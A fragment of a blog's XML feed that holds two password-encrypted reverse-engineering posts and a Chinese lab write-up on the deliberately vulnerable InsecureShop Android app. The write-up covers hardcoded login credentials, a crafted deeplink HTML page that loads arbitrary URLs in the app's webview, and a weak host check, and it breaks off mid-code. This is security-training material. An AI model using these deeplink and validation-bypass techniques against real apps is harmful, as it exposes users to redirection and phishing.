ff070b9ee51433fe123a4266c32c652ffca61c779a9e2588aaaa8c3cbf5bf529d0f16f73d7f903976fb8017085628b1f94cd8871e0412bc14dcff67036cc17858cc0e5d68a0c0a38e54f86d74db168d3b1f768d77ac18479ce9ea8ab0a5a6f30cbd73ffcbb09b8bc3e820513ca7f9c7dfa376b5e5837434d8f0dde91602a40127968472c7703d3078106f20555b1eb2105a91cca7547120414d61911414f9e106683eb3977108d6cfd13831163b671a159362d49f792598d9aceebb66d76c860cd7484cda6bad24528b74832dee41647a3faca34534618817e81a7325035fa1a9db33280ba047368a2c86498f125881c18e779dcb5ec1c94ece8cca6f43a8832dd033ffa6ce43ea66d9155d58fd488491fc7e5d478477ce8e9c4c7f3cc869816bf312211df2e0df0e11607896f2e79d79759b35f2c6f683cd80f23e31e8b0a1cf795f028817a76d1c8d0636a238057e15cca9ec83e52f0e56af7530246bb31f0f32ef89654f1b50fc8611ec0d761778179b14e77e5c4f281f266bb8769bea9bdeb29b2c6fd0c9e462b87f0fe765dbf3849a2168770bc6934a05c98127e07389801c09fea9a08cbae8d8c571c25e48d149d81fa39a9fd85ba4c5cca1e5e7c1889f67ee4b1719b46dbee6539dd438d5f43ea981b8cef0327759d86572fc8dd41ec40af77ba5754155f092ce420026b7bd0e92e64abc4f2854fcb5f3b6c382d6008f04201f14f35c3825036959be4e13918e104027592b9996e3fabc85eb098e177f926e739a7a8992863c8256c134f873d71ef9d1263dd038a28469a6d7e0b8695814d0003c1e413a68636f5899f25f814ae034661c6ca7290b8a390cc242108c771a5853b8f6ff4f10c2bdcde1638ea1508e432211453ef4e6f93a8e3f8017396e1fb5cba22ff15ffd4162cd8daca3386127bbab8a6f8e137b67c056aafc13e0cbdd6b67d5ded66bc14cd3cc47a09404095726e69a6f53c2af72f89647209d6b84ca17c301df7963e1cb457f2f18f4175ee7d056d202071062858d65b348ff9e2c5a45cdefda151c49443a6796000abd4023d09cbe0007c048df20840fba8ca6f636dabc2179e987cd3d173f8c5934f601d3483fd8b47127d932aba0262909183bec5bb7c94aa7e9230bc869ddfe5af4a2d29285a007cce7ec25c8b9a96214971d80aeda947fd926e637ab37d39354e889c884d9e31aad489d14511b27fd8c86886947dc570e7ab263c908fa0ed8076fa1d25e7de915b9f25bf9104258d95e56b9723a7d3c87c33565b56c61d6f6774ae6c3cc9bbb7ffbe6f43243516432c2057b2421e2ba4abacc22494083baa529657e2316837ae96f4faa408fc5652cd388c2c1d8524ab880c4673cdba1fa609980d6590c7549de3b003b3fef8b866fda365d5184ac35d6e95bfdedfe96862580902a4bfd8a024f2c6efda12bbfd5ad5ffbc29f41ac29b80888164530261aed99f7ebfb4d3e823ae9fc7a2d4f00c271b2f0ae70ecff1b89b5fc7dc710c88f863988fe2a93adb05f55f03b1a78a3fe377add113d3d839fc6d17c2060f50f9b32890b8cd2e9be72589d949f09dbe9f25dc45a28304be213409e4a54ce8fc796839678f53777935ab10e046ca3bb181ab866e118b342de8b58c20764f07ff1a2f3450162c7ce0e60d91fdf6d342db24840afea1ed996b25f76e053f9f1d73db543796e3207c03c9a387322fa6f99ffff3b0d067dd7cf57d92f5e4adb1776f9872493c6d464ce68b6dabd5f07b680b671aca9693bf70d22cc7f80ca8db900038bf2d1e57fd26dc576a3aacb1e1441707d2c75a22b5cfc157826d7bb2149f5a74ef650a193cc03d1fb84328887fc34826fce94a9688d5ecf7b7c41c4dbcf23abaaf25f4eff3bd128d488aca68292654d56f7d98dac309c3b13e8950cc14f51bf6c1cb1b5291d2b56024465b1117a75b00f3f75b32df6b5fb6d4e4451b94d3c11acc0a54856fd4da5c4ef186908d16bebef9b492930c7ab3bbf37c43d4f935d7b34c542f42521480cc6019fc26a6142ef2489b80a4c2a4ca51e166082375fd2287c5ffbe23b48188b774b39abc17d2f8480e0afbf7a4055c268f39ef57021362714cb8283fc06180a558524bd3edf504b2345f1dfb8add3f360a30f52688e1fc7b459ba38a76d14267706305e66301b009033769119e0a3807d2b171fd3d98c3c1090478ce377297b51d5937082313a1c666819a2c5a8565f2ddff46b8f33902f79095e160154ebe1bf833339af2eb206efa35400b76d0b65c9e112057f8e03dd01535f90cfabed37c9e959e86048a98901fc5d09c607873436d00a0f69c185eae757691096e9e3a6452b7733a6039e1c3251f00170d15bc66a06dd890b08ac1a8a07e6c523ee62e5bbe2e1436ecefb0e682ef87f953cc05848d56fb36c387df318bfa509496d436df2d9312a70f33407016ac1cc0cf279b2d847a481269663abe6bbe93ae624a04f8ec5000d9c8f6a120ec0ebb69d14c76b86cdfaea198e780b16cbe5baf2aed50cb70ffb0053c3d47119ffee197f03c81a6144e4d8d551215519e87036f44368b982e40e171dc88c3f59ff9163fb8971bf7a1b42ce3c8b3066bec0e62de0fc08495c54805c1e8d192e50f216c821fcb96e8c20813ae7d9de5e7bbbe523684efdfd97b74768d739420f12bcd2295c7462265be7d5febf5368cca130deb7ac7fb6d54e3f15363cd182a48c503e9992b63bc3f37f599ef4726fa1a5aba57ce57d6b7adbe4b91b563c7f3ca92ba9ab52a8447257c6f9176baebb940a06adf767479d7aec609bffcc8564ef8c57237e1b229099922bb6bc71d39ba393c6fffebb4cc6940aca9847685c40fed8517cba0b18eaa717830604016fda2e3c43defb68706c924f73fac36d026d97a50177afbeb619ff57ee9b0d3b250fe2944ed4341e166a356821387b4b249fa9b9bd0483d145bf2271fb8978b0183b1ef78e5ff15fb82abd461fd313f14be5e4bbe024e3a8361fae131fc86c107afca0b5942eb0dd56f8a0409b2d8e7f0a99c7ccc84f9ef417a4f895ce0ca7765b4cb7fe381f5c789c33ce6f4ed579939413e74186d014f391a0144a19739b61829c8611034845d01f9a5e1767d1c2c8879bff23a5a230ea7eb4ae816c065cf335584405e612e34f97bf8dbd1a239056b74a181c0022e0965c7837c7991c69d62a37f20cba111c696e551911f62d7755c5e65dcd98bee936ee78a47d91ed972194e379f5e96374bf0abe8852807e42613dfa116080f8eec43f1795badb35b1026406c1b4700951733727f29f42e35d189c7e909567c6408047816fa858b2c4266abc60b7998126017daf5ce39bef842050b5f581882009f0aab1b2d1ad6ea08b73d72b2409b367290101304038d46278110bd0219af009fd999a30dc6a156ad513812da0cb9663866d2c42eaf7a9ab69704b2844342f74657d7c789352e558c8f95c134c4e4a56a1f940a3ad1036bb84bf4bd6f7c9a43afd85f0536ec96e018069f98c96d56b4ccfe3677c6b9cdcc2c14805013a0f7030536fa29cfe63fe2c50f902cbd87ce1c5058e62ba4e20c9ed67a641977e92bede451d57abac9f6b3de95f8ee9eaedeb053c571ab09b8067224f613afd51d6732c2183fa030065b9ea30c9f160d0ebb2e27c97e64639bdff5af21e7be383d3f62439fa874284da8ee0c7cff3edfde783c44e262779d2dfe1e6b27a51ee7aad637e14affea2fbda234947f59ef2c1cf28a4ca9dc7ca9ff4c8df1cfb9a90b9c131ce6547717f60749367f8de9e6c8eb3650c13d8d0aaba2e718b1ff20108e7a9fea860cb4defdac4a75e5dae2d686864b32f4c5eda7ec9eca280ce76b693adf7c72a16c865753214a23dff81096cf96aafc653c65526d06a4e4addb39eef4efc9f739a5c7b775a6e75d6c706557e0429d85159ea71b4c978818862a9a2f9234a30728d9c261ed66578efa900649cbefc278d3f97499fd5c9dfec527eecc51765aa7bddca18aa0737791efa6fa22279111568d5d3e8eb76561c540a1f3bdbbd10a8c16eb2f8b20e2a4987b0856b35cd842a7bf204ffb531b18aea3a3457604b111b177e93f4f7a4931df33ffc1263019c9ec9e36954630fcbc1ce5563278516ae67505ccb5de094f7506ee06be7277eda4c88c3c929310dff0cab69a84be957d853ed7379a4add1917af1642e1011272ff35703d7ed6302c8a4486db50f0b5ccf641a82bdde197367228c3aaa8570f04fd5757b8d0b8672c1ccdb810d95b53eff15fa593770827016eed080846d714000c86ec9b5005fe42574b8dd15ddb26a60ef88d834735232e8c315ea0245240496fb617c8b4f73eaf18e9f7c437457ad3bf72a8b9ad26fdeeb1638171cbe91dfb829f491be3ae9766151735ef2d9580cde92ac87bdb9f03fc33cf8d4da8219c693afdc1f1a4a614799abd638686cc1ff517edba39d587237c4f4c30dcb3a4f8396c2a611bf03d1f33307eae87fe3c8afe253a3851fc84747df848a8d726e668471e57daa587a31e2ea471c2843754b4b5d0e03aa733e63e3a0658eb57f436a053557e1873cd30f4e99ab0c5fce566242a890c054cd96043c763bad1bea31bdd990b89cb4cf6db1c866a00633a3d68c213ef92f930dc16c757b6ae838dda025d0cfbe6b74c6fdd9921d92710b2d450999ac546f77b063bfdc79ef5da4c2929dbf1130dd7ec26520998de326</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【春节】解题领红包之二 {Windows 初级题}</title>
      <link href="/2025/02/05/%E3%80%90%E6%98%A5%E8%8A%82%E3%80%91%E8%A7%A3%E9%A2%98%E9%A2%86%E7%BA%A2%E5%8C%85%E4%B9%8B%E4%BA%8C%20%7BWindows%20%E5%88%9D%E7%BA%A7%E9%A2%98%7D/"/>
      <url>/2025/02/05/%E3%80%90%E6%98%A5%E8%8A%82%E3%80%91%E8%A7%A3%E9%A2%98%E9%A2%86%E7%BA%A2%E5%8C%85%E4%B9%8B%E4%BA%8C%20%7BWindows%20%E5%88%9D%E7%BA%A7%E9%A2%98%7D/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9e925f69b254ac2fdb9bebd65e64ea4413b2f858942cf5810e9f488d9430d168">8eee5654709acd1a275cced06433ad0e2f6aae42e7229a17b9e5f9d65a5dc8dd8b5d08f26dde3c482829ace62fa8bfcc7363f5c70251173a101621257b9b3a29105f5e6a05b0cf8b790032005901999e1b61133bf131820efb8eb3e64eda97d06299f8b1cb85379c17bb0e92eff986289b4403583c913467e6c4599fb19f92ab8faec4bf7dea0ee13b32a199c54aa79ff1400a99865d0ddc9a8a1fb27d1001aea891979572a643bcdb9a329860d8e8ab8a0a17fa73b7151097a8471dab90c22ebb603637a82304f5a07101588224af09dbe5be0bdc7c6af1a34059d555e95e20889c122bcd5e54555190daa9a761344c1a68deac643bff2cb20da1aebef166549a9b6bd80d4dbc7ff39460a04f7e477378d0279364a0cca4f8ef947d3ccc5611b7ab9109836a1bb04de109a5af67b89a10b52e7ff0a524095544f0394f9f1209c8b2abbd8ba854f1ec8d11c5358fd67c8a03c0ae5e309a6f37e0007be1c401a4b1a26ca9a989ac5e27419776a37540b98289d7753cd0726ffe62e1c39468f611d87b1d35ddb2bbb506149e9b3913997ea0667b3ff80622963ab7d0ca13a1fbefcaf1620188e4c02799a9231f697f2a6392984d17cdf2547388a766e05793c3f7079a8251fc7dcd9ae17611d826fec6ddae67acbd308038ca6b22d6e973bc799f96f2b3fbde0261390dca45bfd3358c06a804e3784d2b276f4ba3ca4b3a18607b2c6a4f731fbc0b8fe74cba5b1496a82a40dc7b893bdf89c2ce78c3bbe8834d0f5bae984250cddce950217dba9bc94a09757e6bb9da092b50771bf300ad3c4266ce67917d0752c342d2872ec3cd2fbe486003f31bf64ecfe46eb5032da2f630b289005a9fdaafa0a8eb9c4200bafb6e8452a04252fa7b0ec4b647d002f642a69708e9d4737bcc4d2df82c03f65815d11bea095b8226891c96eb18eea8bc299132881f58028fb958f0aeb6cf64433bd1c5fb168933e23359002e7efb6f5426243fa9eb0680da5ab453ff950db540917efb6377df94b89751ee596e85556599c705fbf8042784960cdd02c4f6041cbb7a096dc14bce7d870fcbc4d4f4dba748102594be020f89703bed8e9553afa087a7801429da176b74d3539dc9e643b0d06e3e82fa133acb222d0122a8d88a3a5dbaadcdf43ec9c247edcb7a93d82a2d6bbf8c210ab3b178f5037593cb0610eea00f518ad22019de3cac506a23b020a2778bf27c53c57e0148e3995bc856937e6b0683d02f1e908a079135e9b830c3a76dddf50ef253f76b412fe24ee47081d07b487736d7f325f057424e437adfd854cf751941591ec116468465701ed50eced9f6d85885617196d1c672279ade10caf1b40e46702d347f60c74ae43a4f752b6f799fdf886a44f073175afb7f8dd2424083a60d39e6b5ea490b439cd53f91d4fa73e03c57d88ebc24f55b34524afe7d05083b06c9d39a83a7405016d62eff2a9213447aa09e431e1c8cd3db7c81066c99787eded867ae3d269684e367e8e424a9dd5cbf759f7c6d6bab3519da8ce17aa8dfa03bbf4834948b931b47292cf310bfb0b47ff722dbcd5b8433ab7a4ca7dc0d7196f929671762fbd9ea032a9284ee0340c015db4aadd1b19e875c06ec50bd76ecf48fcdfbb6ff81964a3b78298788aa7c21dab34e680e8ef9b9a876291bcefafd25fd018e3b2f2d9975c2ffc98dbed5b5a9367f078fd64168b9476a0d573a145266de269b5d1ee94a9281605157e044aa64b39778e2b299a356a06f944d5ba0e059aa457419ff4837499c782f9a595262bab36d5c072d6fcecaf7bf43d962299e592a852f827dd783f2bdfee8bfacd63f8fd72435dc96267502faf744ad76d22351db385a8dad853c098a9ec46ee27fb41581232ef0ffa10756b2f072215ded09fdcaf7c3dd556a0b32e8630f5582fffcd479f92c2c2fd4bb8f3628f5ee063090fc729b73fcf2aaac00082683efb4ec8ec6ddb8360d5ca6a345fc0b353718d02c006dc86e01c3f36c5411f94b961c39fd6d089f59295998a7159e1fb511dbc9c6b1b45967c3dde82afb2568cd79fcbc5ce415fc9a16f1a9c1683a164c622e90061b357bdc0a73c4e1d58f6e262db6207ea3448e08c71e24b091c04058781b0baacff626feec0decfd3b992536dcf76313d3f14047d0b633885f764e2cde4701c9c37d4b8aafec02083dd362f338a3140e47c57b246d49c9431f48b60737adabc4ee0a43ba81d1d0c229de2f957e63eb5d9db4595c088854bfefe4659e123951091e4c1d4ccae795f4949c1f5beb4b12e69b1358ab62df6054eda7e934d59a2faf83541e1a5a82bac0a4e5b6889ae949e0c27ee14b63aa3944d67f021bd0c706b3bde61a9e7ce4461e1eeb0ac958f69b4582a77d3c07bcb2a33dec99640757fbf8ae9c73bc6cb65242f40d70a832adb83da79ef3a40adece486cf332270249d523ed5dc125da6f337a4a1638705a7d7f1b72356b9041b54047f42ecc095b2df8f5e922ccfb26d62f79c2a043057cd5d9388be112277b83d7aaca0c015d79eb8c016fed16caa2b0aacf1a21e267820d4a7053445ce6a8fa25aa5090f3e626f7781ca618082b648a898ca9047779077545e8cc6fae3b4722fc82dc9642e91f72371d6929dcc1e5e81e487d5d4ce7d33cb71f0aa44fbf6c5470c638340af2bbe398fc9f0ab7ce64875ae3d8cca9013041dc84e321657d41618eb78e86a00cc6471017cdc61b45af0809f6df0866b56e2b01fff022c81fdc7a5607cfcac7424e633f7646486ab929aac3394697c19cf15ceb82a21937bd28f9ec14e763309d87b722eaa16cdbebdbb41d542bbb60b9d4737ea89794044858eeb8421a6cbc1151e6f5775081283c12274b7ef585135ce3faa31eaf77f24bc920801c1dbbad7ef50250187f2ca181c95045bdc354fa958a6a1b08157ba6d6453cb7e8180463b0b85df1bbb355bc60c4dfcd3cdfecc300cd95e962e30dc6c79ef929e76761b5456352c854889f452750103dafc46536037580c38a77590c0575875e685ce71b1a6cc1aef8d2aeac2aa882468211fb7dc28ff27e74ad8541649db46b6bdc6b6a37ef91b74f119cdce23358e67b1fd52b6201d797e68d1f9978b068fa5be0905847f1926e816f518c241e87aab8f18fa26b9176e8d79a85370bdcd74075ba9b8ba7870a2ab5f8155b8cf4b214cc7c7af0d2733039c8a6b55287b24b3ebca22c9bf8cb7cc5a3c51286db7b972757bb2a709b441286d878bdab21783e1416e8becc9375563999db15d5af44c2795b785773fc45b0b5683f70854f346a63ba9c3f58d4416947ee89a638b76f515572897ab48487bfdc6d676dc83107404b642dbbff78e001a502f12ae7d4263bb9eeddaeac6376528907c6568a2e44a20a118f0c334da965f53122eb88154547034991bed8673099cbceb54d6649f9357592b829893cdec6bd2bb265b3278561f30c5f1ceffd5047d9845483e2a09f6154a46c25cb071ff307c25b451a28fdb05e88dba697505b6427ad232b78a195f2aa16a84bf2726bd6558e1949446d36e1c3e8f724c145fb5b5e20a8aa208ff9c2b29f5b455b8e63c15083fed63a553b95119c272c5ec281d2cc3a20fee1dab131be1985aca1843716efb0a2745b1175858ca7fe7f9a5d380d21fd55d8712237b99b28eaaa175fbe81812d9e6a5e6d646831ed53870e9a3ab64c0c4fd497f82f6face47fb8640a865f87b995342faa17dd12b908f6846ff6ff1ba1de6eea0be44183cb81196973fcc5a6ab19d018aba3f3a46f09f9d86880c3570a9fb82f27f6558037e006a4cdb36bfcb0eaa7b2d130e6c26b7d6fd8410262639cc84f1ea744745e7540db8ca92f47d9acb9df94133bed2505ffcec72499d33f2ae117a7724b9026b46734bdcb692362f5778dd5359f6b3b82b83897cec2d7f0d2a2d0ff17563351a85e3b513ffa75a33e151cf8fa8e1ccb06b6c5839c7b826411b056e4bdaf9c13a47d83c7dfab56e85dab124048ab08e8affeaf43e600b1d49b644773900bb1e4e5420d318469c5951cae06c533e6ea1ef03a1f9a19649f59059ecbf2754c5a9bd6d27b623b4dd03dba89b3f8a93397c6b344ceada643c05ce18d9fba6f48784fe19c531ca52bac7fa044da7d6478401620770937d49ded14081c0ecea7e488784d8ddca459836b7152e619f4f47733498ba2828c7bfccdd98ee9a422686bfb4db4e4aa81abcd1ad1612b0ed6ffe78d2d61ddb682969d7aa8c541e14e36f4788149848145c9e9db99f326ab36f2d5d1849bda699a014dfb35c4906544183b38280abda591cf3f82d277b4069430afbe0dd333c68aeda042d2824c2e0f1c8a1388cc066169eaf633720db440c9eafef735ca2fa8717e6c05470702d4736ca70ab6d0bd4fdc526d4cd5fd6a2386dd7bf78084cbe2468d1ecbfd5d1d3f4495832ca95b7afb588cafd6d222eea489254dfd5539e4ee9ee14a96acba1c6528ca68ea6c58234c6ac1c0fc0f026d83a44be39f76931cc8aed634dda24f0dc02591761e491c0289ab82e3a0f147ca142bacb1ca7e5f0d245ec4f818caf616d01fd1f06954be231752a206e657af9ab95517677a18c4d3bd72f1940908fb45bfe03090ad0cd995291442918fe671015943a96071cacaa1573e88e35410b810f5b81b2ba5d585ca40db6750b5bd44dd6ea4b0744b38211d1cf747e6a05602d507f68ac0db6d5829aa127ff0e69242a1a3e81706ceb5f2007bae75c1ec8f611322b9badc1a30286a82fcc1e4d1c02509c071a198b72d11f3b359d51f6795c5c3a9c8755fb7d580d15f66e2c3bf1ffef6fd134fd7932345ef3ffa91b9ec8acea0d5ae4c9c7b32bf9b47ddb7df328f11a087cc4491b15564d038e1407f12c8e74180ceafdad3842eaca743d1638250a5e4dfab49b85e510d751fcb6b596575127a89da71ac59b9b3f2c71170ea9c296e27061e091fad568ba3c4135472ed4b3346517ded669f890c65df22cc67587156d0c6be491bf72dc2ff43244aeebd5f1a5afe0ac9ff2db1b3b01faadfbb8a05301cc216a27c199ef67064407eeeb02cd91f6d0e97807f8ce9d39a5a6a8aa4b2321fc9223b6ece5b355e3aa0fcee57c61cd63b34a72786765dadf6754813c3b0d4cc5d1916bd775a50fd694c64864999be2a06c0899da13feb606450700adb913c7689bd35e739da90829a2ab3e42234be56c0791faa0e011904b7d6aa700f45ab23e65cb1569c326e75ae3de66e94d08165b70f430075388afec2deefd212369f08874ff7e601c12932b2c95ebebf8b1127015a8b44c721d2314cd60ed653b7942a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓APP漏洞学习（上）</title>
      <link href="/2025/01/22/%E5%AE%89%E5%8D%93APP%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%8A%EF%BC%89%20/"/>
      <url>/2025/01/22/%E5%AE%89%E5%8D%93APP%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%8A%EF%BC%89%20/</url>
      
        <content type="html"><![CDATA[<h2 id="硬编码凭证"><a href="#硬编码凭证" class="headerlink" title="硬编码凭证"></a>硬编码凭证</h2><p>某处硬编码了可用于登录应用程序的凭证。</p><p>通过配置文件发现登录相关活动组件</p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/image.png" alt="image.png"></p><p>在<code>com.insecureshop.LoginActivity</code> 中找到登录逻辑</p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_1uuwQOow_B.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_1uuwQOow_B.png"></p><p>关键代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">auth</span> <span class="operator">=</span> Util.INSTANCE.verifyUserNamePassword(username, password);</span><br></pre></td></tr></table></figure><p>在跟代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> HashMap&lt;String, String&gt; <span class="title function_">getUserCreds</span><span class="params">()</span> &#123;</span><br><span class="line">    HashMap&lt;String, String&gt; userCreds = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    userCreds.put(<span class="string">&quot;shopuser&quot;</span>, <span class="string">&quot;!ns3csh0p&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> userCreds;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">verifyUserNamePassword</span><span class="params">(String username, String password)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (username == <span class="literal">null</span> || password == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Username and password must not be null&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">storedPassword</span> <span class="operator">=</span> getUserCreds().get(username);</span><br><span class="line">    <span class="keyword">return</span> storedPassword != <span class="literal">null</span> &amp;&amp; storedPassword.equals(password);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="URL验证不足"><a href="#URL验证不足" class="headerlink" title="URL验证不足"></a><strong>URL验证不足</strong></h2><p>通过深度链接可以在webview中加载任意URL。</p><p>deeplink是特定的URI，</p><ul><li>可以将用户直接带到应用程序中的特定位置，而不是打开外部网站。</li><li>这有助于用户在网页和移动应用之间导航。</li></ul><p>格式</p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_2__z-9Ei8i.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_2__z-9Ei8i.png"></p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_QajjCd7HzX.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_QajjCd7HzX.png"></p><p>通过配置文件获取到<code>insecureshop</code></p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_2MG7nQbAyb.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_2MG7nQbAyb.png"></p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_IvD1QHaN1B.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_IvD1QHaN1B.png"></p><p>有一个检查来验证URI路径是否等于&#x2F;web，之后从一个intent中提取参数url到一个名为data的参数，该参数随后会在webview中加载。这非常有趣，因为我们可以构造这样的URI并传递任意参数作为url。我们将通过使用adb来实现这一点。<br>具体来说，我们将通过adb调用活动管理器，并指定一个动作和一个intent URI。以下命令可以实现这一点。</p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_Cr8rmA-9qc.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_Cr8rmA-9qc.png"></p><p>当然我们也可以去构造html让用户去点击</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Deeplink<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">&quot;text-align:center;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">hl</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;insecureshop://com.insecureshop/web/?url=https://www.google.com&quot;</span>&gt;</span>Click here<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>深度链接滥用的影响</p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_aSBaXuztPO.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_aSBaXuztPO.png"></p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_NYNxLhoKtM.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_NYNxLhoKtM.png"></p><h2 id="主机验证弱检查"><a href="#主机验证弱检查" class="headerlink" title="主机验证弱检查"></a><strong>主机验证弱检查</strong></h2><p>可以绕过主机验证检查，在webview中加载任意URL。</p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_pnHcxnmhqn.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_pnHcxnmhqn.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (uri != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (!StringsKt.equals$<span class="keyword">default</span>(uri.getPath(), <span class="string">&quot;/web&quot;</span>, <span class="literal">false</span>, <span class="number">2</span>, <span class="literal">null</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (StringsKt.equals$<span class="keyword">default</span>(uri.getPath(), <span class="string">&quot;/webview&quot;</span>, <span class="literal">false</span>, <span class="number">2</span>, <span class="literal">null</span>)) &#123;</span><br><span class="line">            <span class="type">Intent</span> <span class="variable">intent2</span> <span class="operator">=</span> getIntent();</span><br><span class="line">            Intrinsics.checkExpressionValueIsNotNull(intent2, <span class="string">&quot;intent&quot;</span>);</span><br><span class="line">            <span class="type">Uri</span> <span class="variable">data2</span> <span class="operator">=</span> intent2.getData();</span><br><span class="line">            <span class="keyword">if</span> (data2 == <span class="literal">null</span>) &#123;</span><br><span class="line">                Intrinsics.throwNpe();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">String</span> <span class="variable">queryParameter</span> <span class="operator">=</span> data2.getQueryParameter(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (queryParameter == <span class="literal">null</span>) &#123;</span><br><span class="line">                Intrinsics.throwNpe();</span><br><span class="line">            &#125;</span><br><span class="line">            Intrinsics.checkExpressionValueIsNotNull(queryParameter, <span class="string">&quot;intent.data!!.getQueryParameter(\&quot;url\&quot;)!!&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (StringsKt.endsWith$<span class="keyword">default</span>(queryParameter, <span 